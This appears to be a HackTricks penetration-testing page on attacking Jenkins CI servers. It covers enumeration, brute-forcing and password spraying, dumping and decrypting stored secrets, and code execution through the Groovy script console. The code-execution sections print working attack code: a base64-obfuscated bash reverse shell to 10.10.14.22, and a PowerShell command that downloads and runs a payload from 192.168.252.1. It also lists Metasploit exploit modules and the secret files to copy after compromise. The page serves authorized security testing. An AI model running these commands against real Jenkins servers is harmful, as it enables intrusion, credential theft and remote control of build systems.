<details> <summary><strong>Support HackTricks and get benefits!</strong></summary> Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)! Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family) Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com) **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/carlospolopm)**.** **Share your hacking tricks submitting PRs to the** [**hacktricks github repo**](https://github.com/carlospolop/hacktricks)**.** </details>
# Jenkins

## Basic Information

Jenkins offers a simple way to set up a **continuous integration** or **continuous delivery** (CI/CD) environment for almost **any** combination of **languages** and source code repositories using pipelines, as well as automating other routine development tasks. While Jenkins doesn’t eliminate the **need to create scripts for individual steps**, it does give you a faster and more robust way to integrate your entire chain of build, test, and deployment tools than you can easily build yourself.\
Definition from [here](https://www.infoworld.com/article/3239666/what-is-jenkins-the-ci-server-explained.html).

## Unauthenticated Enumeration

In order to search for interesting Jenkins pages without authentication like (_/people_ or _/asynchPeople_, this lists the current users) you can use:

```
msf> use auxiliary/scanner/http/jenkins_enum
```

Check if you can execute commands without needing authentication:

```
msf> use auxiliary/scanner/http/jenkins_command
```

Without credentials you can look inside _**/asynchPeople/**_ path or _**/securityRealm/user/admin/search/index?q=**_ for **usernames**.

You may be able to get the Jenkins version from the path _**/oops**_ or _**/error**_

![](<../.gitbook/assets/image (415).png>)

## Login

You will be able to find Jenkins instances that **allow you to create an account and login inside of it. As simple as that.**\
Also if **SSO** **functionality**/**plugins** were present then you should attempt to **log-in** to the application using a test account (i.e., a test **Github/Bitbucket account**). Trick from [**here**](https://emtunc.org/blog/01/2018/research-misconfigured-jenkins-servers/).

### Bruteforce

**Jekins** does **not** implement any **password policy** or username **brute-force mitigation**. Then, you **should** always try to **brute-force** users because probably **weak passwords** are being used (even **usernames as passwords** or **reverse** usernames as passwords).

```
msf> use auxiliary/scanner/http/jenkins_login
```

## Jenkins Abuses

### Known Vulnerabilities

{% embed url="https://github.com/gquere/pwn_jenkins" %}

### Dumping builds to find cleartext secrets

Use [this script](https://github.com/gquere/pwn\_jenkins/blob/master/dump\_builds/jenkins\_dump\_builds.py) to dump build console outputs and build environment variables to hopefully find cleartext secrets.

### Password spraying

Use [this python script](https://github.com/gquere/pwn\_jenkins/blob/master/password\_spraying/jenkins\_password\_spraying.py) or [this powershell script](https://github.com/chryzsh/JenkinsPasswordSpray).

### Decrypt Jenkins secrets offline

Use [this script](https://github.com/gquere/pwn\_jenkins/blob/master/offline\_decryption/jenkins\_offline\_decrypt.py) to decrypt previsously dumped secrets.

### Decrypt Jenkins secrets from Groovy

```
println(hudson.util.Secret.decrypt("{...}"))
```

## Code Execution

### **Create a new project**

This method is very noisy because you have to create a hole new project (obviously this will only work if you user is allowed to create a new project).

1. Create a new project (Freestyle project)
2. Inside **Build** section set **Execute shell** and paste a powershell Empire launcher or a meterpreter powershell (can be obtained using _unicorn_). Start the payload with _PowerShell.exe_ instead using _powershell._
3. Click **Build now**

Go to the projects and check **if you can configure any** of them (look for the "Configure button"):

![](<../.gitbook/assets/image (158).png>)

Or **try to access to the path \_/configure**\_ in each project (example: /_me/my-views/view/all/job/Project0/configure_).

If you are allowed to configure the project you can **make it execute commands when a build is successful**:

![](<../.gitbook/assets/image (159).png>)

Click on **Save** and **build** the project and your **command will be executed**.\
If you are not executing a reverse shell but a simple command you can **see the output of the command inside the output of the build**.

### **Execute Groovy script**

Best way. Less noisy.

1. Go to _path\_jenkins/script_
2. Inside the text box introduce the script

```python
def process = "PowerShell.exe <WHATEVER>".execute()
println "Found text ${process.text}"
```

You could execute a command using: `cmd.exe /c dir`

In **linux** you can do: **`"ls /".execute().text`**

If you need to use _quotes_ and _single quotes_ inside the text. You can use _"""PAYLOAD"""_ (triple double quotes) to execute the payload.

**Another useful groovy script** is (replace \[INSERT COMMAND]):

```python
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = '[INSERT COMMAND]'.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println "out> $sout err> $serr"
```

### Reverse shell in linux

```python
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = 'bash -c {echo,YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yMi80MzQzIDA+JjEnCg==}|{base64,-d}|{bash,-i}'.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println "out> $sout err> $serr"
```

### Reverse shell in windows

You can prepare a HTTP server with a PS reverse shell and use Jeking to download and execute it:

```python
scriptblock="iex (New-Object Net.WebClient).DownloadString('http://192.168.252.1:8000/payload')"
echo $scriptblock | iconv --to-code UTF-16LE | base64 -w 0
cmd.exe /c PowerShell.exe -Exec ByPass -Nol -Enc <BASE64>
```

### MSF exploit

You can use MSF to get a reverse shell:

```
msf> use exploit/multi/http/jenkins_script_console
```

## POST

### Metasploit

```
msf> post/multi/gather/jenkins_gather
```

### Files to copy after compromission

These files are needed to decrypt Jenkins secrets:

* secrets/master.key
* secrets/hudson.util.Secret

Such secrets can usually be found in:

* credentials.xml
* jobs/.../build.xml

Here's a regexp to find them:

```
grep -re "^\s*<[a-zA-Z]*>{[a-zA-Z0-9=+/]*}<"
```

## References

{% embed url="https://github.com/gquere/pwn_jenkins" %}

{% embed url="https://leonjza.github.io/blog/2015/05/27/jenkins-to-meterpreter---toying-with-powersploit/" %}

{% embed url="https://www.pentestgeek.com/penetration-testing/hacking-jenkins-servers-with-no-password" %}
<details> <summary><strong>Support HackTricks and get benefits!</strong></summary> Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)! Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family) Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com) **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/carlospolopm)**.** **Share your hacking tricks submitting PRs to the** [**hacktricks github repo**](https://github.com/carlospolop/hacktricks)**.** </details>
